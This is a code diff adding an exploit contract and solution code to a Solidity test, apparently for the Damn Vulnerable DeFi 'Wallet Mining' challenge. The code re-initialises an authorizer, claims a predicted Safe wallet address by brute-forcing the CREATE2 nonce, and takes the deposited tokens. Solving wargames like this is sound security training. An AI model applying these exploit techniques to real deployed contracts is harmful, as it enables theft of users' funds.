@@ -25,6 +25,30 @@ import {
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
 
+contract Exploit {
+    constructor (
+        DamnValuableToken token,
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer walletDeployer,
+        address safe,
+        address ward,
+        bytes memory initializer,
+        uint256 saltNonce,
+        bytes memory txData
+    ) {
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address[](1);
+
+        wards[0] = address(this);
+        aims[0] = safe;
+
+        authorizer.init(wards, aims);
+        walletDeployer.drop(address(safe), initializer, saltNonce);
+        token.transfer(ward, token.balanceOf(address(this)));
+        safe.call(txData);
+    }
+}
+
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
     address upgrader = makeAddr("upgrader");
@@ -157,7 +181,84 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
+        // Step 1: Find the correct nonce and prepare data
+        (uint256 nonce, bytes memory initializer) = findCorrectNonce();
         
+        // Step 2: Get the transaction data for execution
+        bytes memory execData = prepareExecTransactionData();
+        
+        // Step 3: Deploy the exploit contract
+        new Exploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
+    }
+
+    // Helper function to find the correct nonce
+    function findCorrectNonce() private returns (uint256 nonce, bytes memory initializer) {
+        address[] memory owner = new address[](1);
+        owner[0] = user;
+        initializer = abi.encodeCall(Safe.setup, (owner, 1, address(0), "",
+                                        address(0), address(0), 0, payable(0)));
+        
+        while(true) {
+            address target = vm.computeCreate2Address(
+                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
+                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
+                address(proxyFactory)
+            );
+            if (target == USER_DEPOSIT_ADDRESS) {
+                break;
+            }
+            nonce++;
+        }
+        
+        return (nonce, initializer);
+    }
+
+    // Helper function to prepare the transaction data
+    function prepareExecTransactionData() private returns (bytes memory) {
+        bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
+        
+        // Calculate transaction hash
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
+                address(token),
+                0,
+                keccak256(data),
+                Enum.Operation.Call,
+                100000,
+                100000,
+                0,
+                address(0),
+                address(0),
+                0 // nonce of the Safe (first transaction)
+            )
+        );
+
+        bytes32 domainSeparator = keccak256(abi.encode(
+            0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
+            singletonCopy.getChainId(),
+            USER_DEPOSIT_ADDRESS
+        ));
+
+        // Sign the transaction
+        bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signatures = abi.encodePacked(r, s, v);
+        
+        // Create execution data
+        return abi.encodeWithSelector(
+            singletonCopy.execTransaction.selector, 
+            address(token), 
+            0, 
+            data, 
+            Enum.Operation.Call, 
+            100000, 
+            100000, 
+            0, 
+            address(0), 
+            address(0), 
+            signatures
+        );
     }
 
     /**
